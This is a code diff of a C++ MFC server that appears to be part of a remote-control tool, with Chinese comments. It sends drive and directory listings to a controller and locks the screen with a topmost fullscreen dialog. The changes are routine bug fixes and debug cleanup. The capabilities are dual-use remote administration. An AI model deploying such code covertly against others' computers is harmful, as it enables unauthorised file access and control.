@@ -20,21 +20,6 @@
 
 CWinApp theApp;
 
-void dump(BYTE* pData, size_t nSize) {//?
-	std::string strOut;
-	for (size_t i = 0; i < nSize; i++)
-	{
-		char buf[16] = "";
-		if (i > 0 && (i % 16 == 0))
-		{
-			strOut += "\n";
-		}
-		snprintf(buf, sizeof(buf), "%02X ", pData[i] & 0xFF);
-		strOut += buf;
-	}
-	strOut += "\n";
-	OutputDebugStringA(strOut.c_str());
-}
 
 int makeDriverInfo() {
 	std::string res;
@@ -51,23 +36,12 @@ int makeDriverInfo() {
 	}
 	CPacket pack(1, (BYTE*)res.c_str(), res.size());//打包用的
 	//dump((BYTE*)&pack, pack.nLength + 6);//原来误把strData的地址导出
-	dump((BYTE*)pack.pacData(), pack.pacSize());
+	//dump((BYTE*)pack.pacData(), pack.pacSize());
 	gpServer->sendCom(pack);
 	return 0;
 }
 
-typedef struct file_info {
-	file_info() {
-		isInvalid = 0;
-		isDirectory = 0;
-		hasNext = TRUE;
-		memset(szFileName, 0, sizeof(szFileName));
-	}
-	BOOL isInvalid;//是否有效 1无效
-	BOOL isDirectory;//是否为目录 1是
-	BOOL hasNext;//是否有后续  1有
-	char szFileName[256];//文件名
-}FILEINFO, * PFILEINFO;
+
 
 int makeDirectoryInfo() {
 	std::string strPath;
@@ -77,7 +51,7 @@ int makeDirectoryInfo() {
 		OutputDebugString(_T("当前的命令，不是获取文件列表，命令错误!"));
 		return -1;
 	}
-	if (!_chdir(strPath.c_str()))
+	if (_chdir(strPath.c_str()))
 	{
 		FILEINFO finfo;
 		finfo.isInvalid = TRUE;
@@ -94,6 +68,10 @@ int makeDirectoryInfo() {
 	int hFind = 0;
 	if ((hFind = _findfirst("*", &fdata)) == -1)
 	{
+		FILEINFO finfo;
+		finfo.hasNext = FALSE;
+		CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
+		gpServer->sendCom(pack);
 		OutputDebugString(_T("没有找到任何文件!"));
 		return -3;
 	}
@@ -289,7 +267,7 @@ unsigned __stdcall threadLockDlg(void*arg) {
 	rect.top = 0;
 	rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
 	rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN);
-	rect.bottom *= 1.1;
+	rect.bottom = LONG(rect.bottom*1.1);
 	//该函数改变指定窗口的位置和尺寸。对于顶层窗口，位置和尺寸是相对于屏幕的左上角的：对于子窗口，位置和尺寸是相对于父窗口客户区的左上角坐标的
 	dlg.MoveWindow(rect);
 	dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);//窗口置顶
